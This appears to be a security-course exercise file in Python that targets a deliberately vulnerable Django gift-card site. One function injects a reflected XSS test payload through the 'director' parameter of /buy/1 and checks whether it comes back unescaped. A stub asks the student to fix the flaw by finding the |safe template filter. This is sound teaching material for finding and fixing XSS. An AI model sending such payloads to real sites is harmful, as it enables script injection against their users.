
#%%
# w2d4_answers.py

import os
import sys
import django
import io
import unittest
import json
import re
import contextlib
import time
import shutil
import stat
import inspect

# Setup Django environment
os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'GiftcardSite.settings')
django.setup()

from django.test import TestCase, Client
from django.db import connection
from LegacySite.models import Card, User
from django.template import engines

from django.test import TransactionTestCase
from django.core.management import call_command

#%%
def exploit_xss_vulnerability():
    """
    Exploit XSS vulnerability by injecting malicious script into director parameter.
    
    Args:
        None
        
    Returns:
        bool: True if XSS payload was successfully injected, False otherwise
    """
    from django.test import Client
    from django.conf import settings

    settings.configure()
    
    # Add testserver to ALLOWED_HOSTS if not already there
    if 'testserver' not in settings.ALLOWED_HOSTS:
        settings.ALLOWED_HOSTS.append('testserver')
    
    client = Client()
    # TODO: Create XSS payload and test vulnerable endpoint
    # - Create a malicious JavaScript payload
    # - Replace the current response endpoint with the vulnerable one
    xss_payload = '<script>alert(\'hello\')</script>'
    response = client.get(f'/buy/1?director={xss_payload}')
    
    print(f"XSS exploit response status: {response.status_code}")
    
    if response.status_code == 200:
        response_content = response.content.decode()
        if xss_payload in response_content:
            print("[+] XSS vulnerability successfully exploited!")
            print(f"[+] Malicious payload found in response: {xss_payload}")
            return True
        else:
            print("[-] XSS payload not found in response (may be escaped)")
            return False
    else:
        print(f"[-] Request failed with status {response.status_code}")
        return False
from w2d4_test import test_exploit_xss_vulnerability

if __name__  == '__main__':
    test_exploit_xss_vulnerability(exploit_xss_vulnerability)


# %% 
def fix_xss_vulnerability():
    """
    Fix XSS vulnerability by finding discepencies.
    You can do it manually or edit the front end code.
    
    Args:
        None
        
    Returns:
        None
    """
    # TODO: Look for |safe filter in templates
    # - What does `|` mean in this case
    # - You can do it manually or use re.search within the code 
    pass
# %%


from w2d4_test import test_fix_xss_vulnerability

if __name__ == '__main__':
    print("\nTesting XSS vulnerability fix...")
    test_fix_xss_vulnerability(fix_xss_vulnerability)
# %%
